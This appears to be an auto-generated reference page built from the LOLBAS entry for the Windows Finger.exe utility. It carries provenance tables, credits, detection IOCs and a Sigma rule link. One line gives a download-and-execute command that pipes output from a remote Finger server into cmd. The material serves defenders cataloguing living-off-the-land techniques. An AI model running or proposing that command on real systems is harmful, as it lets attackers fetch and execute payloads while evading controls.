---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Finger.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `finger.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Finger.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Finger.exe](../../tools/windows/finger.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | finger.exe |
| name | Finger.exe |
| type | tool |
| source | lolbas |
| url | https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11) |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@rubn_RB'
  Person: Ruben Revuelta (MAPFRE CERT)
- Handle: '@Ocelotty6669'
  Person: Jose A. Jimenez (MAPFRE CERT)
- Handle: '@DissectMalware'
  Person: Malwrologist
Author: Ruben Revuelta
Commands:
- Category: Download
  Command: finger user@example.host.com | more +2 | cmd
  Description: Downloads payload from remote Finger server. This example connects to "example.host.com" asking for user "user";
    the result could contain malicious shellcode which is executed by the cmd process.
  MitreID: T1105
  OperatingSystem: Windows 8.1, Windows 10, Windows 11, Windows Server 2008, Windows Server 2008R2, Windows Server 2012, Windows
    Server 2012R2, Windows Server 2016, Windows Server 2019, Windows Server 2022
  Privileges: User
  Usecase: Download malicious payload
Created: 2021-08-30
Description: Displays information about a user or users on a specified remote computer that is running the Finger service
  or daemon
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_finger_usage.yml
- IOC: finger.exe should not be run on a normal workstation.
- IOC: finger.exe connecting to external resources.
Full_Path:
- Path: c:\windows\system32\finger.exe
- Path: c:\windows\syswow64\finger.exe
Name: Finger.exe
Resources:
- Link: https://twitter.com/DissectMalware/status/997340270273409024
- Link: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Finger.yml
```

## Detection / Analysis Notes

```text
IOC: finger.exe connecting to external resources.
```

```text
IOC: finger.exe should not be run on a normal workstation.
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_finger_usage.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_finger_usage.yml
- IOC: finger.exe should not be run on a normal workstation.
- IOC: finger.exe connecting to external resources.
```
